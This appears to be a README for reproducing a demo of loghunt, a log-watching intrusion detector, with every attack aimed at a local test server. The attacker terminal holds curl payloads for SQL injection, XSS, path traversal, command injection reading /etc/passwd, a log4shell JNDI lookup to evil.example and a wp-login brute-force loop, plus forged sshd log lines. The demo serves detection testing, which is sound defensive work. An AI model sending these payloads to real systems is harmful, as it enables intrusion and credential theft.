# Reproduce the demo

Everything here runs against a tiny web server on `127.0.0.1` and against a log file you write yourself. Nothing leaves your machine, and no real service is attacked. Use three terminals in the project folder.

## Prepare

```bash
bash scripts/setup.sh
mkdir -p /tmp/loghunt-demo && touch /tmp/loghunt-demo/access.log /tmp/loghunt-demo/auth.log
export LC_ALL=C     # in every terminal, see the note below
```

`LC_ALL=C` matters: sshd writes the month as `Nov`, but `date` on a system with another language writes it in that language and the parser (correctly) does not understand it.

## Terminal 1: the victim

```bash
python scripts/live_web.py --log /tmp/loghunt-demo/access.log
```

It writes a real access log in the nginx `combined` format for real requests.

## Terminal 2: loghunt

```bash
loghunt watch --no-journal --web /tmp/loghunt-demo/access.log --ssh-file /tmp/loghunt-demo/auth.log
```

Start it before the attacks: files are followed from their end.

## Terminal 3: the attacker

Web attacks, mostly one request each:

```bash
curl -s -o /dev/null -A "sqlmap/1.7.2" http://127.0.0.1:18080/                                    # scanner agent
for p in /.env /.git/config /phpmyadmin/; do curl -s -o /dev/null "http://127.0.0.1:18080$p"; done  # sensitive paths
curl -s -o /dev/null "http://127.0.0.1:18080/blog?id=1%20UNION%20SELECT%20username,password%20FROM%20users"  # SQL injection
curl -s -o /dev/null "http://127.0.0.1:18080/blog?q=%3Cscript%3Ealert(1)%3C/script%3E"            # XSS
curl -s -o /dev/null --path-as-is "http://127.0.0.1:18080/blog/../../../../etc/passwd"           # path traversal
curl -s -o /dev/null "http://127.0.0.1:18080/contact?host=1.1.1.1;cat%20/etc/passwd"              # command injection
curl -s -o /dev/null -A '${jndi:ldap://evil.example/a}' http://127.0.0.1:18080/                   # log4shell
for i in $(seq 12); do curl -s -o /dev/null -X POST -d "log=admin&pwd=pass$i" http://127.0.0.1:18080/wp-login.php; done
```

SSH brute force followed by a successful login. The lines are written in the sshd format, with an address from the documentation range:

```bash
fake() { echo "$(date '+%b %e %H:%M:%S') web01 sshd[$RANDOM]: $1" >> /tmp/loghunt-demo/auth.log; }
IP=192.0.2.99
for u in admin root test oracle ubuntu pi; do
  fake "Invalid user $u from $IP port $((40000+RANDOM%9999))"
  fake "Failed password for invalid user $u from $IP port $((40000+RANDOM%9999)) ssh2"
done
sleep 2
fake "Accepted password for deploy from $IP port 51234 ssh2"
```

Each finding appears once in terminal 2 (and as a desktop popup and in Telegram if they are set up). The same rule and address stay quiet for an hour, so to repeat an attack restart `watch` or change `IP`.

## The report afterwards

Stop `watch` with Ctrl+C and analyse the same files:

```bash
loghunt /tmp/loghunt-demo/access.log /tmp/loghunt-demo/auth.log
```
